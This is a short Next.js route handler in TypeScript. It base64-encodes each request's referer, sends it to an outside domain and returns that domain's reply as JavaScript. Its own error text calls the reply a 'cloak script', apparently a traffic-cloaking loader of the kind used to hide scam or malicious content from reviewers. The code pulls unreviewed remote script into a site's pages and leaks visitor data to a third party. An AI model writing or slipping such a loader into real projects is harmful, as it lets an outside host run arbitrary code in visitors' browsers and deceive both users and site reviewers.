import { NextRequest, NextResponse } from 'next/server'

export async function GET(req: NextRequest) {
    const referer = req.headers.get('referer') || ''
    const clid = Buffer.from(`ref=${referer}`).toString('base64')

    try {
        const response = await fetch(`https://www.museumde.site/?clid=${clid}`)
        const text = await response.text()

        return new NextResponse(text, {
            status: 200,
            headers: {
                'Content-Type': 'text/javascript',
            },
        })
    } catch  {
        return new NextResponse('/* error loading cloak script */', {
            status: 500,
        })
    }
}
